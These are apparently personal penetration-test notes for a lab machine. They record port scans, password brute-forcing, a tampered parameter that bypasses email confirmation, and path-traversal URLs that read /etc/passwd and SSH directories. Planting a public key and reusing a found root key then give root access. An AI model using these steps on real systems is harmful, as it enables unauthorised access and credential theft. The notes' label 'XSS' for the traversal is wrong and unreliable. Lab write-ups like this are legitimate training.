### Enumeration
```
IP=192.168.239.231
sudo nmap -sU $IP
sudo nmap -p- -vv $IP
sudo nmap -p22,80,3000,33017 -A $IP
```
### Ports 
- 22
	- OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
- 80
	- http
- 3000 - closed
- 33017
	- Apache httpd 2.4.38 ((Debian))
### Foothold
- 80
	- ![[Pasted image 20240701133910.png]]
	- dirsearch -u http://$IP
		- `/404  /404.html  /500  /robots.txt  /register`
	- /404
		- ![[Pasted image 20240701134021.png]]
	- /robots.txt
		- `# See https://www.robotstxt.org/robotstxt.html for documentation on how to use the robots.txt file`
	- /register
		- username admin  -  already taken
		- abc:abc  -  sends email for confirmation
		- Able to login but says to confirm account
	- /login
		- capture login req with burp. put into req.txt
		- ffuf -request req.txt -request-proto http -w /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -fs 2678
		- sqlmap -r req.txt -p username,password,commit
			- not injectable
		- Change email
			- ![[Pasted image 20240701135309.png]]
			- Can maybe change the confirm value to true
			- ![[Pasted image 20240701135433.png]]
			- Changed it to user confirmed=true
			- Then refresh page and we are in!
			- ![[Pasted image 20240701135502.png]]
			- Tried uploading php, phar, phtml, jpg. It downloads
			- In source code `<a href="[?cwd=&amp;file=webshell.phar&amp;download=true](view-source:http://192.168.239.231/?cwd=&file=webshell.phar&download=true)">webshell.phar</a>`
			- Need to set download to false
			- Tried adjusting url
				- `http://192.168.239.231/?cwd=&file=webshells.php&download=false`
				- Still downloads
				- Sending it via burp still downloads
			- Try some XSS
				- `http://192.168.239.231/?cwd=../../../../../../etc&file=passwd&download=true`
				- downloads /etc/passwd
					- /bin/bash
						- root
						- remi
				- `http://192.168.239.231/?cwd=../../../../../../home/remi/.ssh&file=&download=true`
					- ![[Pasted image 20240701140444.png]]
					- /keys
						- ![[Pasted image 20240701140504.png]]
						- might be able to upload our own file into .ssh
						- Put id_rsa.pub into /.ssh directory
						- ssh -i ~/.ssh/id_rsa remi@$IP
						- now we are ssh
- 22
	- ssh -i root root@$IP
		- Requires password
	- ssh -i id_rsa remi@$IP
		- Requires password
	- ssh -i id_rsa.2 remi@$IP
		- Requires password
	- ssh -i id_rsa.2 remi@$IP
		- Requires password
	- ssh2john on all files > has no password!
- 33017
	- ![[Pasted image 20240701134851.png]]
	- dirsearch -u http://$IP:33017
		- `/admin  /cgi-bin  /info`
	- /admin
		- 404 forbidden
### PE
#### Linux
- remi
	- id
		- uid=1000(remi) gid=1000(remi) groups=1000(remi)
	- sudo -l
		- sudo command not found
	- uname -a
		- Linux boolean 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64 GNU/Linux
	- getcap -r / 2>/dev/null
		- nothing
	- suid
		- find / -type f -perm -04000 -ls 2>/dev/null
		- nothing
	- linpeas
		- nothing
	- .ssh/keys
		- root key
		- ssh -i root root@127.0.0.1
			- giving too many authentication failures
		- ssh -i root root@127.0.0.1 -o IdentitiesOnly=true
			- allows us to get root
### Lessons Learned